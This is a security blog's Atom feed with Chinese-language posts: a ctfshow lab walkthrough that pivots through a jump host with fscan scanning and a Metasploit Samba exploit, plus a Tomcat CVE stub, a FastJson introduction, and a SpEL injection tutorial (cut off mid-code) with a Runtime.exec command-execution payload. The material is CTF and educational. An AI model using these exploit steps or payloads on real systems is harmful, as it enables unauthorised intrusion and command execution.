<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>雲流のLowest World</title>
  
  
  <link href="http://c1oudfl0w0.github.io/blog/atom.xml" rel="self"/>
  
  <link href="http://c1oudfl0w0.github.io/blog/"/>
  <updated>2024-07-23T09:28:12.312Z</updated>
  <id>http://c1oudfl0w0.github.io/blog/</id>
  
  <author>
    <name>C1oudfL0w0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Tomcat漏洞总结</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/23/Tomcat%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2024-07-23T09:14:11.000Z</published>
    <updated>2024-07-23T09:28:12.312Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://xz.aliyun.com/t/10083">https://xz.aliyun.com/t/10083</a></p><span id="more"></span><hr><h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><p>复现环境：<a href="https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017-12615/">https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017-12615/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/10083&quot;&gt;https://xz.aliyun.com/t/10083&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow web859_有跳板机</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/</id>
    <published>2024-07-20T11:34:49.000Z</published>
    <updated>2024-07-20T12:53:37.037Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/">https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/</a></p><p><a href="https://www.cnblogs.com/thebeastofwar/p/17750376.html">https://www.cnblogs.com/thebeastofwar/p/17750376.html</a></p><span id="more"></span><hr><h1 id="连接跳板机"><a href="#连接跳板机" class="headerlink" title="连接跳板机"></a>连接跳板机</h1><p>ssh连接上去，账密均为ctfshow</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> ctfshow@pwn.challenge.ctf.show <span class="token parameter variable">-p28246</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登录上去之后尝试<code>cd ~</code>，发现缺少 &#x2F;home&#x2F;ctfshow 目录</p><p>发现能切成root权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在&#x2F;home目录下创建一个ctfshow目录给权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /home/ctfshow<span class="token function">chmod</span> <span class="token number">777</span> /home/ctfshow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="fscan扫端口"><a href="#fscan扫端口" class="headerlink" title="fscan扫端口"></a>fscan扫端口</h1><p>接下来用ssh传一个fscan上去扫内网</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> <span class="token parameter variable">-P</span> <span class="token number">28246</span> fscan ctfshow@pwn.challenge.ctf.show:/home/ctfshow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720200128540.png" alt="image-20240720200128540"></p><p><code>ifconfig</code>查看内网网段</p><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720203655783.png" alt="image-20240720203655783"></p><p>然后fscan扫描172.2.235.4</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> fscan./fscan <span class="token parameter variable">-h</span> <span class="token number">172.2</span>.235.4/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720203751766.png" alt="image-20240720203751766"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">start infoscan<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.4     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.1     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.5     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.6     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.7     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.2     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.2</span>.235.3     is alive<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: <span class="token number">7</span><span class="token number">172.2</span>.235.6:139 <span class="token function">open</span><span class="token number">172.2</span>.235.4:22 <span class="token function">open</span><span class="token number">172.2</span>.235.5:80 <span class="token function">open</span><span class="token number">172.2</span>.235.6:445 <span class="token function">open</span><span class="token number">172.2</span>.235.5:9000 <span class="token function">open</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开了139和445端口</p><p>看一下这两个端口常有什么漏洞：</p><ul><li>139：samba服务</li><li>445：smb相关服务</li></ul><h1 id="msf-getshell"><a href="#msf-getshell" class="headerlink" title="msf getshell"></a>msf getshell</h1><p>因为跳板机里已经有装了一些攻击工具，那么启动msf：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720202823525.png" alt="image-20240720202823525"></p><p>测试了一下要用<code>is_known_pipename</code>打</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/linux/samba/is_known_pipename<span class="token builtin class-name">set</span> rhost <span class="token number">172.2</span>.235.6exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720204001343.png" alt="image-20240720204001343"></p><p>flag在root下</p><hr><h1 id="测试：内网代理"><a href="#测试：内网代理" class="headerlink" title="测试：内网代理"></a>测试：内网代理</h1><p>这里的跳板机相当于我们已经获得了一台服务器的权限</p><h2 id="单层代理"><a href="#单层代理" class="headerlink" title="单层代理"></a>单层代理</h2><p>现在我们尝试将本地的8085端口转发到可控服务器内网中 172.2.235.5 的80端口（即内网的web服务）</p><p>然后就可以通过访问 127.0.0.1:8085 来访问 172.2.235.5:80</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-L</span> <span class="token number">8085</span>:172.2.235.5:80 ctfshow@pwn.challenge.ctf.show <span class="token parameter variable">-p</span> <span class="token number">28229</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720204543400.png" alt="image-20240720204543400"></p><p><img src="/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20240720204602540.png" alt="image-20240720204602540"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/&quot;&gt;https://fushuling.com/index.php/2023/08/20/ctfshow%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%95%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0%e4%b8%ad/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/thebeastofwar/p/17750376.html&quot;&gt;https://www.cnblogs.com/thebeastofwar/p/17750376.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="渗透" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="ctfshow" scheme="http://c1oudfl0w0.github.io/blog/tags/ctfshow/"/>
    
    <category term="内网" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>FastJson反序列化</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/19/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/19/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-07-19T15:25:33.000Z</published>
    <updated>2024-07-19T15:28:56.045Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://natro92.fun/posts/ac90d224/">https://natro92.fun/posts/ac90d224/</a></p><p><a href="https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://zer0peach.github.io/2023/09/24/FastJSON/">https://zer0peach.github.io/2023/09/24/FastJSON/</a></p><p><a href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80">https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80</a></p><span id="more"></span><hr><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>Fastjson 是 Alibaba 开发的 Java 语言编写的高性能 JSON 库，用于将数据在 JSON 和 Java Object 之间互相转换。</p></blockquote><p>提供两个主要接口来分别实现序列化和反序列化操作。</p><p><code>JSON.toJSONString</code> 将 Java 对象转换为 json 对象，序列化的过程。</p><p><code>JSON.parseObject/JSON.parse</code> 将 json 对象重新变回 Java 对象；反序列化的过程</p><p>所以可以简单的把 json 理解成是一个字符串</p><hr><h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://natro92.fun/posts/ac90d224/&quot;&gt;https://natro92.fun/posts/ac90d224/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&quot;&gt;https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zer0peach.github.io/2023/09/24/FastJSON/&quot;&gt;https://zer0peach.github.io/2023/09/24/FastJSON/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80&quot;&gt;https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="反序列化" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>SPEL表达式注入</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</id>
    <published>2024-07-19T03:59:17.000Z</published>
    <updated>2024-07-19T15:04:07.916Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/">https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/</a></p><p><a href="https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</a></p><p><a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93</a></p><span id="more"></span><hr><h1 id="SPEL表达式基础"><a href="#SPEL表达式基础" class="headerlink" title="SPEL表达式基础"></a>SPEL表达式基础</h1><blockquote><p>在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用</p></blockquote><p>特性：</p><ul><li>使用Bean的ID来引用Bean</li><li>可调用方法和访问对象的属性</li><li>可对值进行算数、关系和逻辑运算</li><li>可使用正则表达式进行匹配</li><li>可进行集合操作</li></ul><h2 id="定界符"><a href="#定界符" class="headerlink" title="定界符"></a>定界符</h2><p><code>#&#123;&#125;</code>：所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等</p><p>和<code>$&#123;&#125;</code>的区别：</p><ul><li><p><code>#&#123;&#125;</code>就是SpEL的定界符，用于指明内容未SpEL表达式并执行；</p></li><li><p><code>$&#123;&#125;</code>主要用于加载外部属性文件中的值；</p></li><li><p>两者可以混合使用，但是必须<code>#&#123;&#125;</code>在外面，<code>$&#123;&#125;</code>在里面，如<code>#&#123;&#39;$&#123;&#125;&#39;&#125;</code>，注意单引号是字符串类型才添加的</p></li></ul><p>结论：<code>$&#123;&#125;</code>只是单纯的一个占位符，会引起一些注入，比如SQL注入之类的。而<code>#&#123;&#125;</code>这就是SPEL特有的定界符。中间的内容会被解析</p><hr><h2 id="表达式类型"><a href="#表达式类型" class="headerlink" title="表达式类型"></a>表达式类型</h2><h3 id="字面值"><a href="#字面值" class="headerlink" title="字面值"></a>字面值</h3><p>最简单的SpEL表达式就是仅包含一个字面值。</p><p>下面我们在XML配置文件中使用SpEL设置类属性的值为字面值，此时需要用到<code>#&#123;&#125;</code>定界符，注意若是指定为字符串的话需要添加单引号括起来：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message1<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;666&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message2<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;'0w0'&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>还可以直接与字符串混用：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>the value is #&#123;666&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Java基本数据类型都可以出现在SpEL表达式中，表达式中的数字也可以使用科学计数法：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>salary<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;1e4&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="引用Bean、属性和方法"><a href="#引用Bean、属性和方法" class="headerlink" title="引用Bean、属性和方法"></a>引用Bean、属性和方法</h3><p>SpEL 表达式能够通过其他 Bean 的 ID 进行引用，直接在 <code>#&#123;&#125;</code> 符号中写入 ID 名即可，无需添加单引号括起来</p><p>常规写法：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SpEL中：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;test&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>引用类属性和引用类方法懒得写了（</p><hr><h3 id="常见的表达式"><a href="#常见的表达式" class="headerlink" title="常见的表达式"></a>常见的表达式</h3><p>一些比较常见的表达式：</p><table><thead><tr><th>运算符类型</th><th>运算符</th></tr></thead><tbody><tr><td>算数运算</td><td>+, -, *, &#x2F;, %, ^</td></tr><tr><td>关系运算</td><td>&lt;, &gt;, &#x3D;&#x3D;, &lt;&#x3D;, &gt;&#x3D;, lt, gt, eq, le, ge</td></tr><tr><td>逻辑运算</td><td>and, or, not, !</td></tr><tr><td>条件运算</td><td>?:(ternary), ?:(Elvis)</td></tr><tr><td>正则表达式</td><td>matches</td></tr></tbody></table><table><thead><tr><th>运算符</th><th>符号</th><th>文本类型</th></tr></thead><tbody><tr><td>等于</td><td>&#x3D;&#x3D;</td><td>eq</td></tr><tr><td>小于</td><td>&lt;</td><td>lt</td></tr><tr><td>小于等于</td><td>&lt;&#x3D;</td><td>le</td></tr><tr><td>大于</td><td>&gt;</td><td>gt</td></tr><tr><td>大于等于</td><td>&gt;&#x3D;</td><td>ge</td></tr></tbody></table><hr><h2 id="变量定义和引用"><a href="#变量定义和引用" class="headerlink" title="变量定义和引用"></a>变量定义和引用</h2><p>在SpEL表达式中，变量定义通过<code>EvaluationContext</code>类的<code>setVariable(variableName, value)</code>函数来实现；在表达式中使用&quot;#variableName&quot;来引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象：</p><ul><li>#this：使用当前正在计算的上下文；</li><li>#root：引用容器的root对象；</li><li>@something：引用Bean</li></ul><hr><h2 id="类型表达式T"><a href="#类型表达式T" class="headerlink" title="类型表达式T()"></a>类型表达式T()</h2><blockquote><p>在 SpEL 表达式中，使用 <code>T(Type)</code> 运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。</p></blockquote><p>使用 <code>T(Type)</code> 来表示 <code>java.lang.Class</code> 实例，Type 必须是类全限定名，但 <code>java.lang</code> 包除外，因为 SpEL 已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段</p><p>值得注意的是，<code>java.lang.Runtime</code> 这个包也是包含于 <code>java.lang</code> 的包的，所以如果能调用 <code>Runtime</code> 就可以进行命令执行</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"T(java.lang.String)"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 创建解析器</span>        <span class="token class-name">Expression</span> exp <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>cmdStr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 解析表达式</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>exp<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 执行</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719145300158.png" alt="image-20240719145300158"></p><p>T中的内容会被解析为一个类。比如图中的String，那么当然可以解析为<code>java.lang.Runtime</code>，因此也就有了命令执行</p><p>只需要改为<code>T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)</code>就能弹计算器</p><hr><h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><h2 id="RCE-ver1——直接RCE"><a href="#RCE-ver1——直接RCE" class="headerlink" title="RCE ver1——直接RCE"></a>RCE ver1——直接RCE</h2><h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vul</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpelVulTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> cmdStr <span class="token operator">=</span> <span class="token string">"new 